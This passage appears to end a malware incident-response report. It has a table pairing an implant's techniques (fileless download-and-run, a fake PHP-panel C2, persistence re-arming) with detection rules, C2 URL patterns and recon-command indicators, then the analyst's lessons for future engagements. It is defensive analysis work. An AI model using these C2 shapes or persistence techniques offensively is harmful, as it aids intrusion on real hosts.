| Download-and-run without disk | Alert on `InternetReadFile` → `VirtualAllocEx`/`WriteProcessMemory` with no `CreateFile` in between |
| Fake PHP-panel C2 | Block the domain + paths; detect the URL *shape* (`*.php?bl=*.txt`, `security=`, `sahipid=`) |
| Operator re-arms persistence | Deny-write ACL on the persistence values, or enforce-absent with Defender ASR / Group Policy; always kill + delete in one window; monitor 120 s after |
| Build paths in the binary | Operator-side hygiene (strip paths); defender-side: grep every sample corpus for `vcpkg`, `buildtrees`, `CFILES` |
| Recon output files | Hunt for `C:\ProgramData\*.bin*`, `C:\Windows\Temp\CDat*`, and any file created by a `cmd /c dir /a /s /b` redirect |

---

## PART 20 — WHAT I'D DO DIFFERENTLY (analyst notes, for the next engagement)

1. **Enable 4688 and PowerShell 4104 auditing *before* touching anything.** Both were
   off on this host, which is why I could not attribute the creator PID of the
   hollowed hosts. That single configuration gap cost more forensic value than any
   other factor.
2. **Never run a scan-and-kill scanner on a host with live interactive sessions**
   (I did this once and killed the user's own agent session, because the marker
   strings appeared in the analyst's own report). Use a **report-only** scanner, then
   act on its output.
3. **Take a full registry + memory snapshot before cleanup**, and keep it. I needed
   the live memory carve (`host5m.bin`) and the 111 KB of beacon captures
   (`capture\requests.jsonl`) that a clean-up-first approach would have destroyed.
4. **Watch the Explorer write-back trap.** Explorer.exe rewrites its *logon-time*
   environment block on **any** `HKCU\Environment` write, resurrecting values that
   existed at logon. Correct order: delete → restart Explorer → never touch that key
   again. Every other order loses.
5. **Diff the environment registry against a known-good baseline**, and treat
   `HKCU\Environment` as a monitored location.
6. **Do not trust a single clean sample.** This implant had at least four concurrent
   hollowed hosts and re-injected 14 seconds after a kill. Sample, then wait, then
   sample again.
7. **Reconstruct the protocol, don't just block it.** Pointing the implant at a
   sinkhole with a trusted CA produced the operator's *entire live protocol* —
   endpoints, parameters, bot ID, security key, heartbeat cadence — in 111 KB of
   JSONL. That is worth more than the implant itself.

---

*Prepared from the reverse engineering of the samples recovered on this host. All
techniques are described in the offensive-methodology frame that a defender or an
authorised red team needs in order to **detect and stop** them — and the countermeasure
column in each section is the point of the exercise.*
